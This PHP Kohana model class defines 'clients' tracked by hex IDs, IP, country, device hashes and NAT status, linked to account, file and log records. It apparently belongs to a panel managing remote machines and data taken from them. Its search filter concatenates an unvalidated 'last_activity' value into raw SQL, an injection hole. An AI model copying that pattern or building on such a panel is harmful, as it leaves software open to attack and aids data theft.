<?php defined('SYSPATH') or die('No direct script access.');

class Model_Client extends ORM {

    const MIN_IMPORTANCE = 0;
    const MAX_IMPORTANCE = 100;
    const MIN_HIGH_IMPORTANCE = 95;

    protected $_primary_key = 'id';
    protected $_table_columns = array(
        'id' => NULL,
        'id_low' => NULL,
        'id_high' => NULL,
        'name' => NULL,
        'group' => NULL,
        'ip' => NULL,
        'country' => NULL,
        'sys_ver' => NULL,
        'client_ver' => NULL,
        'created_at' => NULL,
        'logged_at' => NULL,
        'devhash_4' => NULL,
        'devhash_3' => NULL,
        'devhash_2' => NULL,
        'devhash_1' => NULL,
        'importance' => NULL,
        'userdefined' => NULL,
        'last_activity' => NULL,
    );

    protected $_has_one = array(
        'comment' => array(
            'model' => 'Client_Comment',
            'foreign_key' => 'clientid',
        ),
        'usersystem' => [
            'model' => 'UserSystem',
            'foreign_key' => 'clientid',
        ],
    );

    protected $_has_many = array(
        'logs' => array(
            'model' => 'Log',
            'foreign_key' => 'client_id',
        ),
        'importanceevents' => array(
            'model' => 'Client_ImportanceEvent',
            'foreign_key' => 'clientid',
        ),
        'vars' => array(
            'model' => 'Var',
            'foreign_key' => 'clientid',
            'far_key' => 'clientid',
        ),
        'datagenerals' => [
            'model' => 'Datageneral',
            'foreign_key' => 'client_id',
        ],
        'dataaccounts' => array(
            'model' => 'Dataaccount',
            'foreign_key' => 'clientid',
        ),
        'datafiles' => [
            'model' => 'Datafiles',
            'foreign_key' => 'client_id',
        ],
    );

    protected $errors;

    public function getErrors()
    {
        return $this->errors;
    }

    public function getDate($column){
        $date = new DateTime($this->{$column});
        return $date->format('Y-m-d H:i:s');
    }

    public function getLink(){
        if ( ! $this->id ){
            return '0';
        }

        return '<a class="btn-link" target="_blank" href="/log/' . $this->id . '">' . $this->getFullName() . '</a>';
    }

    public function getClientIDByName($clientName, $prefix = null){
        // wtf?
        if ( '0' == $clientName ) {
            return 0;
        }

        $cid = Helper::getCid($clientName);

        $client = DB::select('id')
            ->from('clients')
            ->where('id_low', '=', $cid[0])
            ->where('id_high', '=', $cid[1]);

        if($prefix){
            $client->where('name', '=', $prefix);
        }


        $client = $client->execute()
            ->current();

        if($client)
            return $client['id'];
        else
            return 0;
    }

    public function getClientID(){
        $base_length = 16;
        $name = null;
        if($this->id_high != 0){
            $lenght = strlen(dechex($this->id_high));
            if($lenght != $base_length){
                $delta = $base_length - $lenght;
                for($i = 0; $i < $delta; $i++){
                    $name .= '0';
                }
            }
            $name .= dechex($this->id_high);
        }
        if($this->id_low != 0){ // cid0
            $lenght = strlen(dechex($this->id_low));
            if($lenght != $base_length){
                $delta = $base_length - $lenght;
                for($i = 0; $i < $delta; $i++){
                    $name .= '0';
                }
            }
            $name .= dechex($this->id_low);
        }
        return mb_strtoupper($name);
    }

    public function getFullName(){
        if($this->loaded())
            return trim($this->name).'.'.$this->getClientID();
        return false;
    }

    public function getNat(){
        $subquery = DB::select(DB::expr('MAX(updated_at) as updated_at'), 'id')
            ->from('storage')
            ->where('client_id', '=', $this->id)
            ->and_where('key', '=', 'NAT status')
            ->and_where_open()
                ->where('value', '=', 'client is behind NAT')
                ->or_where('value', '=', 'client is not behind NAT')
            ->and_where_close()
            ->group_by('id');
        $nat = DB::select('value')
            ->from([$subquery, 's'])
            ->join(['storage', 'q'])
            ->on('s.id', '=', 'q.id')
            ->execute()
            ->as_array(null, 'value');

        if(!empty($nat)){
            if($nat[0] == 'client is behind NAT'){
                return true;
            }else{
                return false;
            }
        }else{
            return null;
        }
    }

    public function getImportanceColor()
    {
        return dechex(32 + $this->importance * 2) . '11' . dechex(32 + (100 - $this->importance) * 2);
    }

    public function selectByFilter($post, $user_id = false, $db=false)
    {
        $additionalEnabled = false;
        $eventsEnabled = false;
        $exactMatchingSearch = true;
        $post = Arr::extract($post, [
            'name',
            'group',
            'ip',
            'start',
            'end',
            'importance_start',
            'importance_end',
            'last_activity',
            'country',
            'get_stat',
            'nat',
            'version',
            'events',
            'events_info',
            'events_module',
            'events_start',
            'events_end',
            'log_start',
            'log_end',
            'log',
            'sysinfo',
            'additionalEnabled',
            'eventsEnabled',
            'exactMatchingSearch',
        ]);
        if (isset($post['additionalEnabled'])) { $additionalEnabled = $post['additionalEnabled']; }
        if (isset($post['eventsEnabled'])) { $eventsEnabled = $post['eventsEnabled']; }
        if (isset($post['exactMatchingSearch'])) { $exactMatchingSearch = $post['exactMatchingSearch']; }

        // TODO: add validation rules
        $validation = Validation::factory($post)
            ->label('name', 'Prefix')
            ->label('group', 'Group')
            ->label('ip', 'IP')

            ->label('start', 'Registered start')
            ->rule('start', 'regex', array(':value', '/^\d{4}\/\d{2}\/\d{2}$/'))

            ->label('end', 'Registered end')
            ->rule('end', 'regex', array(':value', '/^\d{4}\/\d{2}\/\d{2}$/'))

            ->label('version', 'Version')
            ->rule('version', 'digit')

            ->label('importance_start', 'Importance start')
            ->rule('importance_start', 'digit')
            ->rule('importance_start', 'range', array(':value', 0, 100))
            ->rule('importance_start', ['Helper', 'check_importance_view'], [':validation', ':field'])

            ->label('importance_end', 'Importance end')
            ->rule('importance_end', 'digit')
            ->rule('importance_end', 'range', array(':value', 0, 100))
            ->rule('importance_end', ['Helper', 'check_importance_view'], [':validation', ':field'])
            ->rule('importance_end', ['Helper', 'greater_than_or_equal_to'], [':validation', ':field', 'importance_start'])

            // TODO
//            ->rule('nat', 'in_array', [':value', Kohana::$config->load('select.nat')])

            ->label('last_activity', 'LastActivity')
            //TODO: add validation for lastactivity
            ->label('country', 'Country')
            //TODO: add validation for location
            ->label('get_stat', 'Get Stat?');

        if ( ! $validation->check() ) {
            $this->errors = $validation->errors('validation');

            return false;
        }

        if ( ! $db) {
            $clients = ORM::factory('Client');
        } else {
            $clients = $db;
        }

        if($user_id)
            $file_path_net_access = Kohana::find_file('net_access', $user_id, 'json');
        else{
            $file_path_net_access = false;
        }

        /* NAT */
        if(isset($post['nat']) && $post['nat'] != '') {
            $sphinxql = new SphinxQL();
            $query = $sphinxql->new_query()->add_index('nat');
            if($post['nat'] != 2){
                $query->where('nat', $post['nat'], '=')->execute();
            }

            $query = $query->limit(1000000)->execute()['data'];
            $ids = Arr::path($query, ['*', 'id']);
            $clients->where('id', 'IN', $ids);
        }

        /* LAST ACTIVITY */
        if(isset($post['last_activity']) && $post['last_activity'] != '') {
            $clients->where('last_activity', '>=', DB::expr("NOW()::timestamp - INTERVAL '" . $post['last_activity'] . " MINUTE'"));
        }

        /* country */
        if(Helper::issetAndNotEmpty($post['country'])) {
            $alpha_country = Kohana::$config->load('country')->as_array();
            foreach($post['country'] as $k => $v){
                if(strlen($v) == 2){
                    $keys = array_keys($alpha_country, $v);
                    foreach($keys as $key => $value){
                        if($key == 0) {
                            $post['country'][$k] = $value;
                        }else {
                            $post['country'][] = $value;
                        }
                    }
                }
            }

            /* TODO temp fix for external backend, because he has 2 and 3 country code length */
            $country_two_code = [];
            foreach($post['country'] as $three_code){
                if(isset($alpha_country[$three_code])){
                    $country_two_code[] = $alpha_country[$three_code];
                }
            }
            $post['country'] = array_merge($post['country'], $country_two_code);

            $clients->where(
                'country', 'IN', $post['country']
            );
        }

        /* IP */
        if(Helper::issetAndNotEmpty($post['ip'])) {
            if(filter_var($post['ip'], FILTER_VALIDATE_IP)){
                $clients->where('ip', '=', trim($post['ip']));
            }else{
                $clients->where(
                    DB::expr('ip::text'), 'LIKE', '%'.trim($post['ip']).'%'
                );
            }
        }

        /* Version */
        if(Helper::issetAndNotEmpty($post['version'])) {
            $clients->where(
                'client_ver', '=', trim($post['version'])
            );
        }

        /* created_at */
        if (Helper::issetAndNotEmpty($post['start'])) {
            $clients->where('created_at', '>=', $post['start'] . ' 00:00:00');
        }
        if (Helper::issetAndNotEmpty($post['end'])) {
            $clients->where('created_at', '<=', $post['end'] . ' 23:59:59');
        }

        /* IMPORTANCE */
        if (Helper::issetAndNotEmpty($post['importance_start'])) {
            $clients->where('importance', '>=', $post['importance_start']);
        }
        if (Helper::issetAndNotEmpty($post['importance_end'])) {
            $clients->where('importance', '<=', $post['importance_end']);
        } elseif ($user_id && ! ORM::factory('User', $user_id)->hasAction('View client with high importance')) {
            $clients->where('importance', '<=', Model_Client::MIN_HIGH_IMPORTANCE - 1);
        }

        /* GROUP */
        if (Helper::issetAndNotEmpty($post['group']) && !$file_path_net_access) {
            $group_list_mask = preg_grep('#\*#', $post['group']);
            $group_list = preg_grep('#\*#', $post['group'], PREG_GREP_INVERT);

            if(!empty($group_list) || !empty($group_list_mask)){
                if(!empty($group_list_mask)){
                    $cache = DB::select('name')
                        ->from('cache_nets');
                    foreach ($group_list_mask as $m){
                        $cache->or_where('name', 'LIKE', preg_replace('#\*#', '', trim($m)).'%');
                    }
                    $group_list = array_merge($group_list, $cache->execute()->as_array(null, 'name'));
                }

                $clients->where('group', 'IN', $group_list);
            }
        }
        /* NET ACCESS */
        if ($file_path_net_access) {
            $net_list = array_map('trim', json_decode(
                file_get_contents($file_path_net_access), true
            ));

            if(Helper::issetAndNotEmpty($post['group'])){
                $need_groups = [];
//                var_dump($net_list);
                foreach ($net_list as $g){
                    $match = preg_grep('#^'.preg_replace('#\*#', '', $g).'#', $post['group']);
                    if($match){
                        $need_groups = array_merge($need_groups, $match);
                    }
                }
                $clients->where('group', 'IN', $need_groups);
            }else{
                $net_list_mask = preg_grep('#\*#', $net_list);
                $net_list = preg_grep('#\*#', $net_list, PREG_GREP_INVERT);

                if(!empty($net_list) || !empty($net_list_mask)){
                    if(!empty($net_list_mask)) {
                        $cache = DB::select('name')
                            ->from('cache_nets');
                        foreach ($net_list_mask as $m) {
                            $cache->or_where('name', 'LIKE', preg_replace('#\*#', '', trim($m)) . '%');
                        }
                        $net_list = array_merge($net_list, $cache->execute()->as_array(null, 'name'));
                    }

                    $clients->where('group', 'IN', $net_list);
                }
            }
        }

        /* Prefix */
        if (Helper::issetAndNotEmpty($post['name'])) {
            $clients->where('name', 'LIKE', '%'.$post['name'].'%');
        }

        /* Events */
        if( $eventsEnabled ){
            $events_model = DB::select('client_id')->from('clients_events');

            if( Helper::issetAndNotEmpty($post['events'])
                || Helper::issetAndNotEmpty($post['events_info'])
                || Helper::issetAndNotEmpty($post['events_module'])){
                $events_model->or_where_open();
                if($exactMatchingSearch){
                    if(Helper::issetAndNotEmpty($post['events'])){
                        $events_model->or_where(DB::expr('LOWER(event)'), 'IN', array_map('strtolower', $post['events']));
                    }
                    if(Helper::issetAndNotEmpty($post['events_info'])){
                        $events_model->or_where(DB::expr('LOWER(info)'), 'IN', array_map('strtolower', $post['events_info']));
                    }
                    if(Helper::issetAndNotEmpty($post['events_module'])){
                        $events_model->or_where(DB::expr('LOWER(module)'), 'IN', array_map('strtolower', $post['events_module']));
                    }
                }
                else {
                    if(Helper::issetAndNotEmpty($post['events'])){
                        foreach($post['events'] as $e_from_post){
                            $events_model->or_where(DB::expr('LOWER(event)'), 'LIKE', '%'.strtolower($e_from_post).'%');
                        }
                    }
                    if(Helper::issetAndNotEmpty($post['events_info'])){
                        foreach($post['events_info'] as $ei_from_post){
                            $events_model->or_where(DB::expr('LOWER(info)'), 'LIKE', '%'.strtolower($ei_from_post).'%');
                        }
                    }
                    if(Helper::issetAndNotEmpty($post['events_module'])){
                        foreach($post['events_module'] as $em_from_post){
                            $events_model->or_where(DB::expr('LOWER(module)'), 'LIKE', '%'.strtolower($em_from_post).'%');
                        }
                    }
                }
                $events_model->or_where_close();
            }


            if (Helper::issetAndNotEmpty($post['events_start'])) {
                $events_model->where('created_at', '>=', $post['events_start'] . ' 00:00:00');
            }

            if (Helper::issetAndNotEmpty($post['events_end'])) {
                $events_model->where('created_at', '<=', $post['events_end'] . ' 23:59:59');
            }

            $events_client_id = $events_model->group_by('client_id')
                ->execute()
                ->as_array(null, 'client_id');
            if(!empty($events_client_id)){
                $clients->where('id', 'IN', $events_client_id);
            }else{
                $clients->where('id', 'IN', [0]); // TODO empty result
            }
        }

        /* Log */
        if(Helper::issetAndNotEmpty($post['log'])){
            $log_model = DB::select('client_id')
                ->from('clients_log')
                ->where(DB::expr('LOWER(info)'), 'IN', array_map('strtolower', $post['log']));

            if (Helper::issetAndNotEmpty($post['log_start'])) {
                $log_model->where('created_at', '>=', $post['log_start']. ':00');
            }
            if (Helper::issetAndNotEmpty($post['log_end'])) {
                $log_model->where('created_at', '<=', $post['log_end']. ':00');
            }

            $log_client_id = $log_model->group_by('client_id')
                ->execute()
                ->as_array(null, 'client_id');
            if(!empty($log_client_id)){
                $clients->where('id', 'IN', $log_client_id);
            }else{
                $clients->where('id', 'IN', [0]); // TODO empty result
            }
        }

        /* SYSINFO */
        if(Helper::issetAndNotEmpty($post['sysinfo'])){
            $idsSysInfo = [];
            $sysinfo = Kohana::$config->load('select.sysinfo');

            foreach($post['sysinfo'] as $item){
                if(isset($sysinfo[$item])){
                    $idsSysInfo = array_merge($idsSysInfo, json_decode(file_get_contents(APPPATH.'sysinfo_'.$sysinfo[$item].'.json'), true));
                }
            }

            if(!empty($idsSysInfo)){
                $clients->where('id', 'IN', $idsSysInfo);
            }else{
                $clients->where('id', 'IN', [0]); // TODO empty result
            }
        }

        return $clients;
    }

    public function timeElapsed($column){
        return Helper::time_elapsed_string($this->{$column}, true);
    }

    public function getDevhashFormatted(){
        return Model_Devhash::getDevhashName(
            $this->devhash_4,
            $this->devhash_3,
            $this->devhash_2,
            $this->devhash_1
        );
    }

}
